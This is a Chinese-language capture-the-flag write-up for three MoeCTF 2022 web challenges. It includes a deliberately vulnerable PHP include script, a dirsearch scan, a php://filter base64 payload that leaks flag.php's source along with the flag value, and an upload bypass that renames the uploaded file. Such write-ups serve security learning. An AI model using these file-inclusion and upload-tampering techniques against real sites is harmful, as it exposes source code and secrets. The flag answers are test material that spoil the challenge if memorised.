# MoeCTF 2022

## Web

### baby\_file

#### 题目

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
?>
```

#### 解题

这题是简单的文件包含，先用 dirsearch 扫描一下。

```bash
$ python dirsearch.py -u http://node2.anna.nssctf.cn:28169/
```

可以扫描到 `/flag.php` ，通过构造以下 Payload

```url
file=php://filter/read=convert.base64-encode/resource=flag.php
```

可以获得到 `flag.php` 的源码

```php
<?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;
NSSCTF{b3333432-7dff-4ca8-b6f4-cd4bd5fc6688};
?>
```

### ezhtml

通过 `右键 - 查看网页源代码` 寻找答案没有结果，发现底下有个 `evil.js` ，访问该文件可以得到 flag 力！

### what are y0u uploading？

随便提交一个图片可以得到以下回显

```html
文件上传成功！filename：fea5445634569c851f2933f11259cc92.png
我不想要这个特洛伊文件，给我一个f1ag.php 我就给你flag!
```

通过修改 Request 中的 `filename` 为 `f1ag.php` 即可得到 flag 了。

<figure><img src=".gitbook/assets/what_are_y0u_uploading？-1.png" alt=""><figcaption></figcaption></figure>
